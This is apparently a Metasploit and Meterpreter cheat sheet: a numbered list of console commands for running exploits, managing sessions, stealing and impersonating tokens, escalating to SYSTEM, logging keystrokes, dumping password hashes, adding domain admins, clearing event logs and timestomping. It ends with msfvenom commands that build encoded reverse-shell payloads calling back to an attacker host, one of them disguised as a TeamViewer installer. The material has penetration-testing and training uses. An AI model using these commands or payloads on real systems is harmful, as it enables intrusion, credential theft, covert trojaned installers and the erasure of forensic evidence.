1.	Show all exploits within the Framework.: `show exploits`
2.	Show all payloads within the Framework.: `show payloads`
3.	Show all auxiliary modules within the Framework.: `show auxiliary`
4.	Search for exploits or modules within the Framework.: `search <name>`
5.	Load information about a specific exploit or module.: `info`
6.	Load an exploit or module (example: use windows/smb/psexec).: `use <name>`
7.	Load an exploit by using the index number displayed after the search command.: `use <number>`
8.	Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.: `LHOST`
9.	The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).: `RHOST`
10.	Set a specific value globally (for example, LHOST or RHOST).: `setg <function>`
11.	Show the options available for a module or exploit.: `show options`
12.	Show the platforms supported by the exploit.: `show targets`
13.	Specify a specific target index if you know the OS and service pack.: `set target <number>`
14.	Specify the payload to use.: `set payload <payload>`
15.	Specify the payload index number to use after the show payloads command.: `set payload <number>`
16.	Show advanced options.: `show advanced`
17.	Automatically migrate to a separate process upon exploit completion.: `set autorunscript migrate -f`
18.	Determine whether a target is vulnerable to an attack.: `check`
19.	Execute the module or exploit and attack the target.: `exploit`
20.	Run the exploit under the context of the job. (This will run the exploit in the background.): `exploit -j`
21.	Do not interact with the session after successful exploitation.: `exploit -z`
22.	Specify the payload encoder to use (example: exploit –e shikata_ga_nai).: `exploit -e <encoder>`
23.	Display help for the exploit command.: `exploit -h`
24.	List available sessions (used when handling multiple shells).: `sessions -l`
25.	List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.: `sessions -l -v`
26.	Run a specific Meterpreter script on all Meterpreter live sessions.: `sessions -s <script>`
27.	Kill all live sessions.: `sessions -K`
28.	Execute a command on all live Meterpreter sessions.: `sessions -c <cmd>`
29.	Upgrade a normal Win32 shell to a Meterpreter console.: `sessions -u <sessionID>`
30.	Create a database to use with database-driven attacks (example: db_create autopwn).: `db_create <name>`
31.	Create and connect to a database for driven attacks (example: db_connect autopwn).: `db_connect <name>`
32.	Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.): `db_nmap`
33.	Delete the current database.: `db_destroy`
34.	Delete database using advanced options.: `db_destroy <user:password@host:port/database>`
## **Meterpreter**
35.	Open Meterpreter usage help.: `help`
36.	Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.: `run <scriptname>`
37.	Show the system information on the compromised target.: `sysinfo`
38.	List the files and folders on the target.: `ls`
39.	Load the privilege extension for extended Meterpreter libraries.: `use priv`
40.	Show all running processes and which accounts are associated with each process.: `ps`
41.	Migrate to the specific process ID (PID is the target process ID gained from the ps command).: `migrate <proc. id>`
42.	Load incognito functions. (Used for token stealing and impersonation on a target machine.): `use incognito`
43.	List available tokens on the target by user.: `list_tokens -u`
44.	List available tokens on the target by group.: `list_tokens -g`
45.	Impersonate a token available on the target.: `impersonate_token <DOMAIN_NAMEUSERNAME>`
46.	Steal the tokens available for a given process and impersonate that token.: `steal_token <proc. id>`
47.	Stop impersonating the current token.: `drop_token`
48.	Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.: `getsystem`
49.	Drop into an interactive shell with all available tokens.: `shell`
50.	Execute cmd.exe and interact with it.: `execute -f <cmd.exe> -i`
51.	Execute cmd.exe with all available tokens.: `execute -f <cmd.exe> -i -t`
52.	Execute cmd.exe with all available tokens and make it a hidden process.: `execute -f <cmd.exe> -i -H -t`
53.	Revert back to the original user you used to compromise the target.: `rev2self`
54.	Interact, create, delete, query, set, and much more in the target’s registry.: `reg <command>`
55.	Switch to a different screen based on who is logged in.: `setdesktop <number>`
56.	Take a screenshot of the target’s screen.: `screenshot`
57.	Upload a file to the target.: `upload <filename>`
58.	Download a file from the target.: `download <filename>`
59.	Start sniffing keystrokes on the remote target.: `keyscan_start`
60.	Dump the remote keys captured on the target.: `keyscan_dump`
61.	Stop sniffing keystrokes on the remote target.: `keyscan_stop`
62.	Get as many privileges as possible on the target.: `getprivs`
63.	Take control of the keyboard and/or mouse.: `uictl enable <keyboard/mouse>`
64.	Run your current Meterpreter shell in the background.: `background`
65.	Dump all hashes on the target. use sniffer Load the sniffer module.: `hashdump`
66.	List the available interfaces on the target.: `sniffer_interfaces`
67.	Start sniffing on the remote target.: `sniffer_dump <interfaceID> pcapname`
68.	Start sniffing with a specific range for a packet buffer.: `sniffer_start <interfaceID> packet-buffer`
69.	Grab statistical information from the interface you are sniffing.: `sniffer_stats <interfaceID>`
70.	Stop the sniffer.: `sniffer_stop <interfaceID>`
71.	Add a user on the remote target.: `add_user <username> <password> -h <ip>`
72.	Add a username to the Domain Administrators group on the remote target.: `add_group_user <"Domain Admins"> <username> -h <ip>`
73.	Clear the event log on the target machine.: `clearev`
74.	Change file attributes, such as creation date (antiforensics measure).: `timestomp`
75.	Reboot the target machine.: `reboot`
### **Encoders**
1. Selecting an Encoder `msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`
2. Generating Payload - Without Encoding: `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`
3. Generating Payload - With Encoding: `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`
4. Generating Payload - Without Encoding: `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe`
5. Generating Payload - With Encoding: `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe`
### **MSFVenom**
1. Generating Payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx`
2. Generating Payload:`msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5`

